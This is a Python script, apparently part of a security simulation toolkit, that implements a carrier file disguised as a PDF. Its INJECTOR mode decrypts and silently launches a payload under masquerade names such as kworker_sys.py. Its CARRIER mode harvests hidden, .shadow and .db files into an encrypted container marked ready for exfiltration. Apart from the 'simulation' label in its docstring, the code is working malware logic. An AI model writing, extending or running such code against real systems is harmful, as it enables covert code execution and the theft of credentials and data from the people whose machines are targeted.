#!/usr/bin/env python3
"""
The Stowaway: Advanced Encrypted Carrier.
Simulates an air-gapped threat vector (USB/Media).
Carries data out (Exfil) or payloads in (Injector).
Self-contained, encrypted body.
"""

import os
import sys
import time
import secrets
import base64
import json
import subprocess

# Import utils for heavy obfuscation
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import utils

class Stowaway:
    def __init__(self, mode="INJECTOR", target_dir="/tmp", payload_path=None):
        self.mode = mode
        self.target_dir = target_dir
        self.key = secrets.token_bytes(32) # Harder key
        self.body = b""
        self.fake_type = "PDF" # Masquerade as PDF by default

        # Load payload if Injector
        if self.mode == "INJECTOR" and payload_path:
            try:
                with open(payload_path, 'rb') as f:
                    self.body = utils.obfuscate_payload(f.read(), self.key, self.fake_type)
            except: pass

    def deploy(self, drop_path):
        """Serialize self to disk as an obfuscated blob."""
        container = {
            "mode": self.mode,
            "key": base64.b64encode(self.key).decode('utf-8'),
            "body": base64.b64encode(self.body).decode('utf-8'),
            "type": self.fake_type
        }

        # If mimicking a file, we might just write the raw bytes if it was self-extracting,
        # but for this sim we wrap in JSON for the 'dumper' tool to read.
        # Ideally, a real stowaway would be a Polyglot.

        # For HEAVY obfuscation: Rename to match fake type
        if not drop_path.lower().endswith(".pdf"):
            drop_path += ".pdf"

        with open(drop_path, 'w') as f:
            json.dump(container, f)
        return drop_path

    @staticmethod
    def activate(drop_path, target_dir):
        """The 'Explosion'. Reads self, decrypts body, executes."""
        try:
            with open(drop_path, 'r') as f:
                container = json.load(f)

            mode = container["mode"]
            key = base64.b64decode(container["key"])
            body_enc = base64.b64decode(container["body"])
            fake_type = container.get("type", "PDF")

            if mode == "INJECTOR":
                # Decrypt payload
                payload_code = utils.deobfuscate_payload(body_enc, key, fake_type)

                # Drop and Execute Payload (e.g., malware.py) - Masquerade Name
                name_pool = ["kworker_sys.py", "dbus_daemon.py", "system_update.py"]
                malware_path = os.path.join(target_dir, secrets.choice(name_pool))

                with open(malware_path, 'wb') as f:
                    f.write(payload_code)

                # Execute detached
                subprocess.Popen([sys.executable, malware_path, "--port", "8888", "--target", target_dir])
                print(f"[STOWAWAY] Injected payload to {malware_path}")

            elif mode == "CARRIER":
                # Scan for critical AND hidden files, encrypt into body, update self
                loot = b""

                # 1. Critical Directory (Chunked Read)
                critical_dir = os.path.join(target_dir, "critical")
                if os.path.exists(critical_dir):
                    for f in os.listdir(critical_dir):
                        try:
                            path = os.path.join(critical_dir, f)
                            if os.path.isfile(path):
                                loot += f"\n--- {f} ---\n".encode()
                                with open(path, 'rb') as tf:
                                    while chunk := tf.read(8192): # Chunking 8KB
                                        loot += chunk
                        except: pass

                # 2. Hidden Assets in War Zone
                if os.path.exists(target_dir):
                    for root, dirs, files in os.walk(target_dir):
                        for f in files:
                            # Target hidden files or specific extensions
                            if f.startswith(".") or f.endswith(".shadow") or f.endswith(".db"):
                                try:
                                    path = os.path.join(root, f)
                                    loot += f"\n--- {f} ---\n".encode()
                                    with open(path, 'rb') as tf:
                                        while chunk := tf.read(8192):
                                            loot += chunk
                                except: pass

                    # Re-encrypt self with loot using heavy obfuscation
                    # Note: We append loot to existing body or replace? Usually carrier starts empty.
                    new_body = utils.obfuscate_payload(loot, key, fake_type)
                    container["body"] = base64.b64encode(new_body).decode('utf-8')
                    container["status"] = "EXFIL_READY"

                    with open(drop_path, 'w') as f:
                        json.dump(container, f)
                    print(f"[STOWAWAY] Exfiltrated {len(loot)} bytes (raw) to container.")

        except Exception as e:
            print(f"[STOWAWAY] Activation Failed: {e}")

if __name__ == "__main__":
    # Self-activation logic for simulation
    if len(sys.argv) > 2:
        Stowaway.activate(sys.argv[1], sys.argv[2])
